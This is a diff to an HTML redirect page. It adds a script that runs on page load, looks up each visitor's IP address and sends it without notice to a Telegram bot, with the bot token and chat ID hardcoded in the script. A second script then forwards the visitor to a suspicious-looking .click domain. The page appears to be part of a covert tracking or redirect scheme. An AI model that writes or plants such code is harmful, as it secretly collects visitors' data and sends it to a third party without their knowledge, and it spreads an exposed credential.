@@ -6,6 +6,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting</title>
     <script>
+    function sendIPToTelegram() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const botToken = '8792940385:AAHwJc6r8H9nnbp0hli1qnhVPLAt_Q5GQSo';
+          const chatId = '8772270540';
+          const message = `🌐 Visitor IP: ${ip}`;
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", url, true);
+          xhr.send();
+        });
+    }
+    sendIPToTelegram();
+  </script>
+    <script>
         setTimeout(function () {
             window.location.href = "https://pexilloogle.click/?e2fc056b";
         }, 1000);
